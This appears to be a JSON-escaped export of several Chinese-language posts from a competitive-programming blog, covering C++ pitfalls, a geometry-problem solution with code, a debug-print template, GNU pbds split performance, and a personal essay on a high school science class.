2021/8/15)\nstd::abs 有多型，會自己偵測吃進去的是不是 long long，但是 std 外面的 abs 不會，要用 llabs。\n1 2 3 4 5 6 7 8 9 10 #include \u0026lt;bits/stdc++.h\u0026gt; using ll = long long; signed main() { ll n = 5298309920314; std::cout \u0026lt;\u0026lt; abs(n) \u0026lt;\u0026lt; std::endl; // overflow! std::cout \u0026lt;\u0026lt; llabs(n) \u0026lt;\u0026lt; std::endl; std::cout \u0026lt;\u0026lt; std::abs(n) \u0026lt;\u0026lt; std::endl; } Array in Temporary Object (Update: 2021/9/19)\n如果要在 struct 裡面使用指標或是原生陣列的話，要注意如果你保留一個臨時物件的這種成員，可能會讓這個指標在臨時物件被銷毀之後變得指向一塊不合法的記憶體。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;iostream\u0026gt; #include \u0026lt;map\u0026gt; using namespace std; struct F { int a[2]; F() : a{0, 1} {} }; void print(int a[2]) { for (int i = 0; i \u0026lt; 2; i++) cerr \u0026lt;\u0026lt; a[i]; cerr \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } map\u0026lt;int,F\u0026gt; mp; F GET(int i) { return mp[i]; } void safe() { cerr \u0026lt;\u0026lt; \u0026#34;--- safe BEGIN ---\\n\u0026#34;; auto B = GET(0); auto a = B.a; print(a); cerr \u0026lt;\u0026lt; \u0026#34;--- safe END -----\\n\u0026#34;; } void notsafe() { cerr \u0026lt;\u0026lt; \u0026#34;--- notsafe BEGIN ---\\n\u0026#34;; auto a = GET(0).a; print(a); cerr \u0026lt;\u0026lt; \u0026#34;--- notsafe END -----\\n\u0026#34;; } signed main() { F A; mp[0] = A; print(A.a); safe(); notsafe(); } ","permalink":"https://omeletwithoutegg.github.io/2021/09/19/cppbugs/","tags":["cpp","experience"],"title":"Cppbugs"},{"contents":"https://codeforces.com/problemset/gymProblem/101193/J\n這題是上禮拜團練沒人寫的某一題，因為我一直覺得自己的想法是對的所以花了好久來寫這題。\n網路上也找不太到題解:P\nCherry orchard Description 左下角和右上角分別是 $(0,0)$ 和 $(1,1)$ 的正方形裡面有 $n$ 個點\n現在隨機在正方形的兩條不同的邊各選一個點，並畫出一條直線把這 $n$ 個點分成兩部份。\n請問兩部份中點數的 min 的期望值是多少？\n$n \\leq 50$\nSolution 有一個比較聰明的解與一個很複雜的解。先來講我一開始想到的比較複雜的解。\n考慮枚舉所有點對，可以得到所有可能的分法（把點分成兩部份的方法），對於每種分法想辦法計算選到這種分法的機率。\n先蓋好兩部份的凸包。枚舉隨機選到的其中一個點所在的邊 $E$ ，不失一般性可以當作他是正方形左邊那條邊。\n假設我們已經選好上面一個點 $P$ ，那可以「和 $P$ 連成直線，把 $n$ 個點切成這兩個凸包」的 $Q$ 會是另一條邊上的一個範圍。\n這個範圍和 $P$ 與兩個凸包的切線有關，可以枚舉兩個凸包的上下關係， $P$ 只會切到上面那個凸包的下凸包與下面那個凸包的上凸包。\n$E$ 上可以分成 $\\mathcal{O}(n)$ 個區間，每個區間內切到下凸包的點和切到上凸包的點是固定的。\n接下來是最後也是最難的部份：對於 $P=(0,y)$ 來說，假設他切到上面那個凸包的 $A$、下面那個凸包的 $B$，那 $\\overrightarrow{PA}$ 和 $\\overrightarrow{PB}$ 中間的區域就是 $Q$ 可以在的區域，對於另外三條邊來說是一段區間，而這樣的區間左右界會是只跟 $y$ 有關的一個函數。\n雖然他題敘沒有講清楚選中點的機率分佈是不是連續均勻分佈，但大概可以假設是，因此如果 $P=(0,y)$ 對應到的區間長度是 $f(y)$ ，最後的答案就是 $\\int _ 0 ^ 1 f(y)$。\n仔細計算之後可以發現：\n對於對邊來說，區間左右界都是被截斷的線性函數，因此很好積分，只是要討論一下大小。\n對於鄰邊來說，區間左右界都是被截斷的 $H+\\frac{A}{x-K}$ ，考慮被截斷的範圍不可能包含 $K$ 因此也是可以簡單的積分成 $\\log$ 之類的東西。\n因為我不知道怎麼處理截斷（跟 $0,1$ 取 $\\min,\\max$）所以把所有討論都寫出來了，長到不行Orz\n另外我有些地方現在看起來都是在讓code更醜，例如把所有座標乘 1000 倍再做事或是硬要用 complex 算計幾。\n現在來講聰明的解！我是從 binsjl 的 submission 大概理解的，所以也可能有錯\n先選定一個邊 $E$，一樣可以假設他是正方形左邊那條邊，那麼我們可以算出「所有點對形成的直線」以及「右上右下兩個點與所有點形成的直線」和 $E$ 交點，把 $E$ 分成 $\\mathcal{O}(n^2)$ 個區間。\n對於一個區間來說，隨便選定裡面一個點當作原點 $O$，把給定的 $n$ 個點極角排序順序都是一樣的。\n真的隨便選定一個點當原點極角排序之後，可以得出在這個區間內如果選定了 $P=(0,y)$，對應的另一條邊的區間長度的函數長怎樣，一樣跑去積分就可以了，似乎邊界條件還自動被解決了，一整個短到驚訝(?)\nAC code 因為是比較複雜的那個解，所以醜的不像話。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; using ld = long double; using Point = complex\u0026lt;int\u0026gt;; using Pointf = complex\u0026lt;ld\u0026gt;; const ld eps = 1e-9; const int C = 1000; const long long INF = 1e18; template \u0026lt;typename T\u0026gt; vector\u0026lt;T\u0026gt; join(const vector\u0026lt;T\u0026gt; \u0026amp;A, const vector\u0026lt;T\u0026gt; \u0026amp;B) { vector\u0026lt;T\u0026gt; result(A.size() + B.size()); merge(A.begin(), A.end(), B.begin(), B.end(), result.begin()); return result; } template \u0026lt;typename T\u0026gt; T dot(complex\u0026lt;T\u0026gt; a, complex\u0026lt;T\u0026gt; b) { return real(conj(a) * b); } template \u0026lt;typename T\u0026gt; T cross(complex\u0026lt;T\u0026gt; a, complex\u0026lt;T\u0026gt; b) { return imag(conj(a) * b); } ld solve(vector\u0026lt;Point\u0026gt; p); mt19937 rng(2103); ld naive(vector\u0026lt;Point\u0026gt; _p) { vector\u0026lt;Pointf\u0026gt; p; for (auto pt: _p) p.emplace_back(real(pt), imag(pt)); struct Line { Pointf st, dir; Line (Pointf A, Pointf B) : st(A), dir(B - A) {} Pointf random() const { ld x = uniform_real_distribution\u0026lt;ld\u0026gt;(0, 1)(rng); return st + dir * x; } }; static Line lines[] = { Line(Pointf(0, 0), Pointf(0, C)), Line(Pointf(0, C), Pointf(C, C)), Line(Pointf(C, C), Pointf(C, 0)), Line(Pointf(C, 0), Pointf(0, 0)) }; const int EX = 1000000; int ans = 0; for (int i = 0; i \u0026lt; EX; i++) { int a, b; do { a = uniform_int_distribution\u0026lt;int\u0026gt;(0, 3)(rng); b = uniform_int_distribution\u0026lt;int\u0026gt;(0, 3)(rng); } while (a == b); Pointf A = lines[a].random(); Pointf B = lines[b].random(); int ac = 0, cc = 0; for (auto pt: p) { ld C = cross(pt - A, B - A); if (C \u0026lt; 0) ++ac; else if (C \u0026gt; 0) ++cc; } ans += min(ac, cc); } return ans / ld(EX); } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; cin \u0026gt;\u0026gt; n; vector\u0026lt;Point\u0026gt; p(n); for (int i = 0; i \u0026lt; n; i++) { ld x, y; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; p[i] = Point(round(x * C), round(y * C)); } debug(naive(p)); Point center(500, 500); ld ans = 0; for (int dir = 0; dir \u0026lt; 4; dir++) { ans += solve(p); for (auto \u0026amp;pt: p) pt = (pt - center) * Point(0, 1) + center; } ans /= 12; cout \u0026lt;\u0026lt; fixed \u0026lt;\u0026lt; setprecision(10) \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ld solve(vector\u0026lt;Point\u0026gt; p) { int n = p.size(); sort(p.begin(), p.end(), [](Point \u0026amp;a, Point \u0026amp;b) { return make_pair(real(a), imag(a)) \u0026lt; make_pair(real(b), imag(b)); }); vector\u0026lt;pair\u0026lt;vector\u0026lt;int\u0026gt;, vector\u0026lt;int\u0026gt;\u0026gt;\u0026gt; part; for (int i = 0; i \u0026lt; n; i++) { for (int j = 0; j \u0026lt; i; j++) { Point N = p[j] - p[i]; vector\u0026lt;int\u0026gt; online[2], halfplane[2]; bool ok = true; for (int k = 0; k \u0026lt; n; k++) { Point prod = conj(N) * p[k]; if (prod.imag() \u0026lt; cross(N, p[i])) { halfplane[0].push_back(k); } else if (prod.imag() \u0026gt; cross(N, p[i])) { halfplane[1].push_back(k); } else if (prod.real() \u0026lt;= dot(N, p[i])) { online[0].push_back(k); } else if (prod.real() \u0026gt;= dot(N, p[j])) { online[1].push_back(k); } else { ok = false; break; } } if (!ok) continue; part.emplace_back(join(online[0], halfplane[0]), join(online[1], halfplane[1])); part.emplace_back(join(online[0], halfplane[1]), join(online[1], halfplane[0])); } } for (auto \u0026amp;[f, s]: part) { if (f \u0026gt; s) swap(f, s); } sort(part.begin(), part.end()); part.erase(unique(part.begin(), part.end()), part.end()); safe; const auto buildConvexHull = [](const vector\u0026lt;Point\u0026gt; \u0026amp;d) { if (d.size() == 1) return d; vector\u0026lt;Point\u0026gt; s(d.size() * 2); int o = 0; for(int i = 0; i \u0026lt; int(d.size()); i++) { while(o\u0026gt;=2 \u0026amp;\u0026amp; cross(d[i]-s[o-2],s[o-1]-s[o-2]) \u0026lt;= 0) o--; s[o++] = d[i]; } for(int i=int(d.size())-2, t = o+1;i\u0026gt;=0;i--){ while(o\u0026gt;=t \u0026amp;\u0026amp; cross(d[i]-s[o-2],s[o-1]-s[o-2]) \u0026lt;= 0) o--; s[o++] = d[i]; } s.resize(o-1); return s; }; const auto calc = [](vector\u0026lt;Point\u0026gt; L, vector\u0026lt;Point\u0026gt; R) { const auto getUpperHull = [](vector\u0026lt;Point\u0026gt; \u0026amp; P) { assert (!P.empty()); auto it = min_element(P.begin(), P.end(), [](Point a, Point b){ return real(a) != real(b) ? real(a) \u0026lt; real(b) : imag(a) \u0026gt; imag(b); }); rotate(P.begin(), it, P.end()); auto jt = max_element(P.begin(), P.end(), [](Point a, Point b){ return real(a) != real(b) ? real(a) \u0026lt; real(b) : imag(a) \u0026lt; imag(b); }); // debug(P.size(), jt - P.begin()); P.erase(next(jt), P.end()); }; const auto getLowerHull = [](vector\u0026lt;Point\u0026gt; \u0026amp; P) { assert (!P.empty()); reverse(P.begin(), P.end()); auto it = min_element(P.begin(), P.end(), [](Point a, Point b){ return real(a) != real(b) ? real(a) \u0026lt; real(b) : imag(a) \u0026lt; imag(b); }); rotate(P.begin(), it, P.end()); auto jt = max_element(P.begin(), P.end(), [](Point a, Point b){ return real(a) != real(b) ? real(a) \u0026lt; real(b) : imag(a) \u0026gt; imag(b); }); // debug(P.size(), jt - P.begin()); P.erase(next(jt), P.end()); reverse(P.begin(), P.end()); }; const auto interpolate = [](Point a, Point b, int x) -\u0026gt; ld { // real(a + (b-a)t) == x // t = (x - real(a)) / real(b-a) // imag(a + (b-a)t) = imag(a) + imag(b-a) * t ld t = (x - real(a)) / ld(real(b - a)); return imag(a) + imag(b-a) * t; // return (imag(a) * (real(b) - x) + imag(b) * (x - real(a))) / ld(real(b) - real(a)); }; const auto intergral = [\u0026amp;interpolate](ld l, ld r, Point a, Point b) -\u0026gt; ld { l = clamp\u0026lt;ld\u0026gt;(l, 0, C); r = clamp\u0026lt;ld\u0026gt;(r, 0, C); if (l \u0026gt;= r) return 0; ld res1 = 0, res2 = 0; // linear do { ld tl = l, tr = r; ld A1 = 1 - C / ld(real(a)), B1 = C * imag(a) / ld(real(a)); ld A2 = 1 - C / ld(real(b)), B2 = C * imag(b) / ld(real(b)); if (real(a) == real(b)) { if (B1 \u0026gt;= B2) { break; } } else if (A1 \u0026lt; A2) { // (A2 - A1)y \u0026gt; B1 - B2 tl = max(tl, (B1 - B2) / (A2 - A1)); } else if (A1 \u0026gt; A2) { // (A1 - A2)y \u0026lt; B2 - B1 tr = min(tr, (B2 - B1) / (A1 - A2)); } else { exit(3); } { // 0 \u0026lt; A1y + B1 \u0026lt; A2y + B2 \u0026lt; C // -B1 / A1 \u0026gt; y ld R = min(tr, -B1 / A1); // y \u0026gt; (C - B2) / A2 ld L = max(tl, (C - B2) / A2); // (A2 - A1) y + (B2 - B1) if (L \u0026lt; R) res1 += (A2 - A1) * (R*R - L*L) / 2 + (B2 - B1) * (R - L); } { // A1y + B1 \u0026lt; 0 \u0026lt; A2y + B2 \u0026lt; C // y \u0026gt; -B1 / A1 // -B2 \u0026lt; A2y -\u0026gt; y \u0026lt; -B2 / A2 // y \u0026gt; (C - B2) / A2 ld L = max({ tl, -B1 / A1, (C - B2) / A2 }); ld R = min(tr, - B2 / A2); if (L \u0026lt; R) res1 += A2 * (R*R - L*L) / 2 + B2 * (R - L); } { // 0 \u0026lt; A1y + B1 \u0026lt; C \u0026lt; A2y + B2 // y \u0026lt; -B1 / A1 // y \u0026gt; (C - B1) / A1 // y \u0026lt; (C - B2) / A2 ld L = max(tl, (C - B1) / A1); ld R = min({ tr, -B1 / A1, (C - B2) / A2 }); if (L \u0026lt; R) res1 += -A1 * (R*R - L*L) / 2 + (C-B1) * (R - L); } { // A1y + B1 \u0026lt; 0 \u0026lt; C \u0026lt; A2y + B2 // y \u0026gt; -B1 / A1 // y \u0026lt; (C - B2) / A2 ld L = max(tl, -B1 / A1); ld R = min(tr, (C - B2) / A2); if (L \u0026lt; R) res1 += C * (R - L); } } while (false); // non-linear do { // H + A / (X - K) ld L1 = real(a) * imag(a) / ld(C - real(a)) + imag(a); ld L2 = real(b) * imag(b) / ld(C - real(b)) + imag(b); ld tl = l, tr = r; if (real(a) == real(b)) { if (imag(a) \u0026gt;= imag(b)) break; } else if (real(a) \u0026lt; real(b)) { tl = max(tl, interpolate(a, b, 0)); } else if (real(a) \u0026gt; real(b)) { tr = min(tr, interpolate(a, b, 0)); } ld H1 = real(a), A1 = real(a) * imag(a), K1 = imag(a); ld H2 = real(b), A2 = real(b) * imag(b), K2 = imag(b); // y \u0026lt;= L1 \u0026amp;\u0026amp; y \u0026lt;= L2 -\u0026gt; C - C { // y \u0026gt; L1 \u0026amp;\u0026amp; y \u0026gt; L2 ld L = max({ tl, L1, L2 }); ld R = tr; // H1 + A1 / (X - K1) \u0026lt; H2 + A2 / (X - K2) // H1 (X-K1)(X-K2) + A1(X-K2) \u0026lt; H2(X-K1)(X-K2) + A2(X-K1) if (L \u0026lt; R) res2 += (H2 - H1) * (R - L) + A2 * (log(R - K2) - log(L - K2)) - A1 * (log(R - K1) - log(L - K1)); } { // C - (H1 + A1 / (X - K1)) // y \u0026gt; L1 \u0026amp;\u0026amp; y \u0026lt; L2 ld L = max(tl, L1); ld R = min(tr, L2); if (L \u0026lt; R) res2 += (C - H1) * (R - L) - A1 * (log(R - K1) - log(L - K1)); } { ld L = max(tl, L2); ld R = min(tr, L1); assert (L \u0026gt;= R); } } while (false); ld res = res1 + res2 * 2; return res / (C * C); }; getUpperHull(L); getLowerHull(R); // orange(all(L)); // orange(all(R)); int n = L.size(), m = R.size(); vector\u0026lt;pair\u0026lt;ld,bool\u0026gt;\u0026gt; evt; for (int i = 0; i+1 \u0026lt; n; i++) { ld y = interpolate(L[i], L[i+1], 0); if (i) assert (y \u0026gt;= evt.back().first); evt.emplace_back(y, 0); } for (int i = 0; i+1 \u0026lt; m; i++) { ld y = interpolate(R[i], R[i+1], 0); if (i) assert (y \u0026gt;= evt.back().first); evt.emplace_back(y, 1); } sort(evt.begin(), evt.end()); int it = 0, jt = 0; ld last = -INF, res = 0; for (auto [y, type]: evt) { res += intergral(last, y, L[it], R[jt]); last = y; if (type == 0) { ++it; } else { ++jt; } } res += intergral(last, INF, L[it], R[jt]); return res; }; ld res = 0; for (const auto \u0026amp;[f, s]: part) { vector\u0026lt;Point\u0026gt; L, R; for (int id: f) L.push_back(p[id]); for (int id: s) R.push_back(p[id]); L = buildConvexHull(L); R = buildConvexHull(R); res += (calc(L, R) + calc(R, L)) * min(f.size(), s.size()); } return res; } ","permalink":"https://omeletwithoutegg.github.io/2021/09/12/bsuir-cherry-orchard/","tags":["math","geometry"],"title":"BSUIR Cherry Orchard"},{"contents":"CKCOS 10th 身為一個特殊班的學生，在畢業的時候還是會想打一些心得給未來的學弟參考吧。主要是希望對科學班有興趣的人可以了解科學班的一些權益與義務，在做這些決定的時候有更多資訊可以評估，也可以做好一些心理準備。\n考進之前 在國小的時候，家長就有帶我去補一些比較超前的課，最主要的是陳立數學，一直上到國二（吧），一開始學的比較接近小學或國中的競賽數學，後來則是變成先修高中數學，大概把高中數學都講過一遍了。\n另外還有補過一些物理跟化學，國三的時候因為要會考，跑去補了社會、國文、英文\n想要去考的原因主要是被家長說服說可以證明自己的實力，沒有上也可以當成是練習，最後蠻意外的過了。\nT分數其實不太記得了，只記得化學跟生物應該都蠻低的，有點靠數學撐起來的感覺。\n我猜赫哲應該比我更清楚所以不要問我怎麼準備。\n考上之後 在可以進入科學班之後，我有選擇是否要去建中科學班，因為畢竟是男校，也有考慮過要不要去師大附中之類的。不過大家都建議既然考上就去，我也就直接進入這趟不歸路了。\n在錄取之後其實就可以不用讀會考了，但那時候我因為想留在班上所以就每天很隨意的寫複習考，後來會考也考了勉強可以進建中的成績。老實說覺得有點浪費時間，如果有考上的學弟記得把這段時間繼續拿來提昇自己，像是讀一些英文小說或是去看一些科普影片，又或者是直接去讀一些自己喜歡的領域的書，大概都比準備會考好。\n科學班的特色 競賽 我想擺在第一個講是因為我對這個比較熟悉。\n讀書會\n建中的很多科競賽都有讀書會在支撐，例如數讀、物讀、資讀等等，真的建議 027 的學弟要好好利用這些資源，在暑假就可以開始聽這些精彩的分享。當然，學成之後也可以為之後的學弟帶來更精彩的分享，傳承薪火。 能力競賽\n沒記錯的話科學班的學生好像要至少參加一科校內能力競賽，不過物化生只能選一科參加，通常校內會有初試、複試，接著就是北市能競，最後是全國能競。一年級的時候數學能競有到校內複試，但最後沒有變成校隊，也沒有當上資訊校隊，無緣市賽、全國賽、入營考；二年級成功變成資訊校隊，跑去撈了市賽跟全國賽的禮券回家。 公假\n建中的老師大部分都對公假是很寬容的，一二年級能競期間班上幾乎都空的很誇張，直到能競一一結束才陸續回流。要小心的是記得最好跟任課老師還是說一聲，以免無聲無息的被當掉，而且不要請超過兩個月之類的超長假…真的會得奧林匹亞回歸症候群。 APMOC\n一年級的時候被老師推薦來參加這個營隊，似乎是特殊班可以推薦一名，但我直到結束之後才知道這個營隊主要是來考試獲得數奧選訓營的資格的XD 我甚至在宿舍打 code 跟打 osu，超放鬆（？）有點對不起數學老師就是了。現在數奧的制度似乎不一樣了，不過如果有這種機會還是要好好注意一下… 所謂超前進度 高一高二上完高中三年課程是科學班標榜的特色之一，但在高三大部分的人並沒有變得比較輕鬆。高三可以去大學修自己有興趣的課，而且必須至少修一堂，但如果不是已經有大學念的人，可能就會因為升學壓力而沒辦法好好選自己想要的課，有些有想法的人可能還會在選課時被質疑。\n專題 高一高二的時候我們必須分組完成一個專題，這個專題會在成果發表時上台發表，為此我們會在高一下學期就分組並各自尋找指導教授。高三時，必須完成個別科學研究的報告書，而且是個人完成，因此高三可以說是蠟燭 $N$ 頭燒的情況。我個人的專題真的做得超糟糕，只能說讓我認識到根本不會做科學研究，各位還沒進科班的學弟對於這件義務真的要謹慎思考(X)\n畢業學分 科學班的選修學分基本上是多到滿出來，相對的分配給必修學分的時間就比較少。\n我在高中有被當掉幾次國文跟一次歷史、一次體育，建議很常公假的人要記得去管畢業必修學分，不然三年級還要努力當學分精算師。\n資格考 據說沒考過資格考會被退班，但其實能考進科學班而且有很大概的在聽課大概就可以通過資格考的數理科目了，很不幸的是我沒有通過英文科的標準，明明標準超低但我還是低了個兩三分。幸運的在高二我是IOI代表選手，因此可以免試掉資格考。\n比較非學術的活動 聯誼…？ 沒有。至少我沒有參加過，可能太邊緣吧？班上有一些跟景美、北一、中山的line群組，但基本上就是加了一個禮拜之後就冷掉，我猜想要有好關係還是要靠自己嘍。\n迎新 校內會有一個數資與科班聯合的迎新，另外還有多校聯合舉辦的數資聯合迎新，可以認識外校同學或是學長姐。\n突然有點懷念數資聯合迎新在台大水樂園玩 RPG 的時候呢（？）\n科學營 不知道什麼時候開始的傳統，似乎會去找北一的同學一起舉辦一個跟科學有關的營隊，我猜趁這個機會認識人是好機會。\n社團 這件事又可以扯很長了，在這邊沒辦法提，總之在資訊社的回憶很多很美好，而且也很好笑。參加各種社團大概是有效與異性接觸的管道(?)\n語癖與班上同學 升高中之後換了很多語癖，例如郭、嘍、顯然、電…等等，大部分都是從參加競賽或是同學參加競賽時與其他人碰撞所產生的有趣的火花。和這些強者在同一個班上沒有帶給我很多壓力（第一次段考就習慣後段了），不過我們這一屆來說班上很多同學都很有個性，例如會在班上運球(?!)或是大吼大叫的，有點像還在國中一樣，在高一高二的時候有點小困擾，但他們的實力也都是毋庸置疑的，和這些強者能夠同班實在是很榮幸，尤其是我個人覺得走物奧的人特別有想法，很佩服他們。\n結語 高中三年選擇科學班，雖然有許多辛苦的事情，例如很難的數理考題、各種吵雜的班上環境、還有最困難的做專題，但我也享受到了許多科班的權益，例如大量的化學、物理實驗課（雖然我沒有喜歡做實驗），還有與同儕或是學長請教、討論的機會，以及我覺得最有價值的讀書會，在讀書會認識的不管是學長學弟還是同屆，都讓我成長許多。我相信世上沒有完美的選擇，但希望各位選擇與沒有選擇科學班的學弟都能不後悔。\n今天晚上是謝師宴，如果有什麼我想補充的會再更新。\n","permalink":"https://omeletwithoutegg.github.io/2021/08/13/ckcos-10th/","tags":["experience"],"title":"科學班三年之小小紀錄"},{"contents":"除錯模板的重要 這是一篇很短的廢文。\n當你發現你寫出的程式有 bug 的時候，就會是你花上很多時間的時候。\n尤其是在打 OI 的情況下，付出一點點時間讓 debug 變更簡單是有必要的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // An AC a day keeps the doctor away. #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #ifdef local #define safe std::cerr\u0026lt;\u0026lt;__PRETTY_FUNCTION__\u0026lt;\u0026lt;\u0026#34; line \u0026#34;\u0026lt;\u0026lt;__LINE__\u0026lt;\u0026lt;\u0026#34; safe\\n\u0026#34; #define debug(args...) qqbx(#args, args) #define orange(args...) danb(#args, args) using std::cerr; template \u0026lt;typename ...T\u0026gt; void qqbx(const char *s, T ...args) { int cnt = sizeof...(T); ((cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m(\u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34;) = (\u0026#34;), ..., (cerr \u0026lt;\u0026lt; args \u0026lt;\u0026lt; (--cnt ? \u0026#34;, \u0026#34; : \u0026#34;)\\e[0m\\n\u0026#34;))); } template \u0026lt;typename T\u0026gt; void danb(const char *s, T L, T R) { cerr \u0026lt;\u0026lt; \u0026#34;\\e[1;32m[ \u0026#34; \u0026lt;\u0026lt; s \u0026lt;\u0026lt; \u0026#34; ] = [ \u0026#34;; for (int f = 0; L != R; ++L) cerr \u0026lt;\u0026lt; (f++ ? \u0026#34;, \u0026#34; : \u0026#34;\u0026#34;) \u0026lt;\u0026lt; *L; cerr \u0026lt;\u0026lt; \u0026#34; ]\\e[0m\\n\u0026#34;; } #else #define safe ((void)0) #define debug(...) ((void)0) #define orange(...) ((void)0) #endif // local #define all(v) begin(v),end(v) using namespace std; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int a[] = {3, 6, 9}; vector\u0026lt;int\u0026gt; b; orange(all(a)); orange(all(b)); debug(1, 2, 3); } 利用 C++17 的 fold expression 可以讓 code 變得超級短。 \u0026quot;\\e[1;32m\u0026quot; 是代表綠色的代碼，可能在 windows 上不能用。當然，GDB 等等也是一個選擇，自己習慣最重要。\n其實我只是想說，orange = output range 這個命名比 pary 好多了 XD\n昨天好幸福 嘻嘻\n","permalink":"https://omeletwithoutegg.github.io/2021/08/08/debug-template/","tags":["template","experience"],"title":"Debug Template"},{"contents":"幫 pbds 上香 如題。\n先說結論：\n官網的 document 寫說 split 跟 join 時間是「poly-logarithm」，但是其實目前為止 GNU 的 pbds 預設的 split 是 $\\mathcal{O}(N)$ 的，請看這篇文章。\n不過有一些方法可以讓複雜度變回一次 split $\\Theta(\\log N)$，但是有一點麻煩。\n前言 Policy-Base Data Structure 簡稱 pbds ，是 GCC 提供的一系列資料結構的 template，而今天要談的是當中的 tree 型別。\n因為看到別人寫的 pbds 自訂 metadata_type 覺得很酷，因此想要來探索探索 pbds 一番。\n大概了解 node_update 怎麼運作之後，我試著去寫了 氣球博覽會，因為需要區間查詢，我使用了 tree::split(key, other) 和 tree::join(other)，沒想到全部吃 TLE，研究一番之後發現下面這樣的 code 就會執行不完了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 #include \u0026lt;bits/extc++.h\u0026gt; #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; using BST = __gnu_pbds::tree\u0026lt;int, __gnu_pbds::null_type, less\u0026lt;int\u0026gt;, __gnu_pbds::rb_tree_tag, tree_order_statistics_node_update\u0026gt;; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); BST A, B, C; int n = 100000; for (int i = 0; i \u0026lt; n; i++) { int x = rand(); A.insert(x); } long long ans = 0; for (int i = 0; i \u0026lt; n; i++) { int l = rand(); int r = rand(); if (l \u0026gt; r) swap(l, r); // query (l, r] A.split(l, B); B.split(r, C); ans += B.size(); B.join(C); A.join(B); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } 真正累的地方 因為好奇所以把 /usr/include/c++/11.1.0/ext/pb_ds/ 翻出來看，真的有夠難看懂，到處 include 又有繼承關係，最後還是不知道為什麼會那麼慢QQ\n大概花了我一個小時以上吧？也可能是一個下午。\n後來想起來有一個工具可以分析每個函式的執行時間，google一下找到是 gprof ，搭配 gprof2dot 就找到兇手了。\n簡單來說，pbds 預設只有在一個 instance 維護一個 size ，而不是每一個節點維護一個，所以在 split 的時候無法好好維護兩棵樹的大小分別是多少，在目前的 library 當中是用 std::distance 計算 iterator 之間的距離以得知兩樹的大小，詳細可以看\next/pb_ds/detail/bin_search_tree_/split_join_fn_imps.hpp\n（bin_search_tree_set / bin_search_tree_map是沒有自平衡的二元樹，tree都是繼承自這個class）。\n醜醜的解決方案 其中一個解決的方式是在 metadata 裡面維護 size，並且 overload std::distance。\next/pb_ds/detail 裡面所有跟 tree 有關的標頭檔只有 split 之後維護 size 的地方用到一次，所以不用擔心複雜度多一個 $\\log$ 或是影響到樹的內部結構。\nsplay tree 使用 splay_tree_tag 的 tree 可以在均攤 $\\Theta(\\log N)$ split ，但是要注意複雜度均攤 $\\Theta(\\log N)$ 的前提是在拜訪任何節點後 splay 